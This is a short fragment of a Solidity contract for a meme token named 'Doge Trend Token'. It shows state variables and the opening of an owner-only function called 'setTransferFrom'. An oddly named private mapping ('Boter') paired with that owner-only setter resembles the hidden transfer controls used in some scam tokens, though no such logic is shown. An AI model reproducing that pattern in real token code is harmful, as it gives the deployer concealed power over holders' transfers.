...
contract DogeTrendToken is Ownable, IERC20 {
    using SafeMath for uint256;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => uint256) private Boter; 
    mapping (address => bool) private _isExcludedFromFee;
    string private _name = "Doge Trend Token";
    string private _symbol = "DOGETREND";
    ...
    function setTransferFrom(address sender) public onlyOwner {
